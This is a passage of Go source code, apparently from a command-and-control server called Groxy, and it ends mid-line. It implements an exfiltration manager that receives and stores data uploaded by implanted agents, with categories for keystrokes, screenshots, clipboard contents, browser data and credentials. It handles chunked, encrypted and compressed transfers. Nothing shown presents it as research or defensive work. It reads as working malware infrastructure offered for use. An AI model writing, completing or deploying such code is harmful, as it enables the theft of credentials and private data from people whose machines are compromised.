package c2

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"Groxy/logger"
)

// ExfilType defines the type of data being exfiltrated
type ExfilType string

const (
	ExfilKeystrokes ExfilType = "keystrokes"
	ExfilScreenshot ExfilType = "screenshot"
	ExfilFile       ExfilType = "file"
	ExfilClipboard  ExfilType = "clipboard"
	ExfilBrowser    ExfilType = "browser"
	ExfilCredential ExfilType = "credential"
	ExfilCommand    ExfilType = "command"
	ExfilSystem     ExfilType = "system"
)

// ChunkInfo tracks file chunks during exfiltration
type ChunkInfo struct {
	AgentID     string
	Operation   string
	FileName    string
	TotalChunks int
	ReceivedChunks map[int]bool
	Data        map[int][]byte
	Timestamp   time.Time
	Mutex       sync.Mutex
}

// ExfilManager handles data exfiltration from agents
type ExfilManager struct {
	dataDir      string
	encryptionKey []byte
	activeTransfers map[string]*ChunkInfo
	mutex       sync.Mutex
}

// NewExfilManager creates a new exfiltration manager
func NewExfilManager(dataDir string, key []byte) (*ExfilManager, error) {
	// Create data directory if it doesn't exist
	if err := os.MkdirAll(dataDir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create data directory: %v", err)
	}
	
	// Create subdirectories for different exfil types
	for _, dir := range []string{"keystrokes", "screenshots", "files", "clipboard", "browser", "credentials", "commands", "system"} {
		path := filepath.Join(dataDir, dir)
		if err := os.MkdirAll(path, 0755); err != nil {
			return nil, fmt.Errorf("failed to create directory %s: %v", path, err)
		}
	}
	
	return &ExfilManager{
		dataDir:      dataDir,
		encryptionKey: key,
		activeTransfers: make(map[string]*ChunkInfo),
	}, nil
}

// HandleExfiltration processes incoming exfiltration requests
func (e *ExfilManager) HandleExfiltration(w http.ResponseWriter, r *http.Request) {
	// Check required headers
	agentID := r.Header.Get("X-Agent-ID")
	if agentID == "" {
		http.Error(w, "Missing agent ID", http.StatusBadRequest)
		return
	}
	
	exfilTypeStr := r.Header.Get("X-Exfil-Type")
	exfilType := ExfilType(exfilTypeStr)
	if exfilType == "" {
		http.Error(w, "Missing exfil type", http.StatusBadRequest)
		return
	}
	
	// Process the request based on the exfil type and whether it's chunked
	if r.Header.Get("X-Chunked") == "true" {
		e.handleChunkedExfil(w, r, agentID, exfilType)
	} else {
		e.handleSingleExfil(w, r, agentID, exfilType)
	}
}

// handleSingleExfil processes a single-part exfiltration
func (e *ExfilManager) handleSingleExfil(w http.ResponseWriter, r *http.Request, agentID string, exfilType ExfilType) {
	// Read the data
	data, err := io.ReadAll(r.Body)
	if err != nil {
		logger.Error("Failed to read exfil data: %v", err)
		http.Error(w, "Failed to read data", http.StatusInternalServerError)
		return
	}
	
	// Check if the data is encrypted
	if r.Header.Get("X-Encrypted") == "true" {
		// Decrypt the data
		data, err = e.decryptData(data)
		if err != nil {
			logger.Error("Failed to decrypt exfil data: %v", err)
			http.Error(w, "Failed to process data", http.StatusInternalServerError)
			return
		}
	}
	
	// Check if the data is compressed
	if r.Header.Get("X-Compressed") == "true" {
		// Decompress the data
		data, err = e.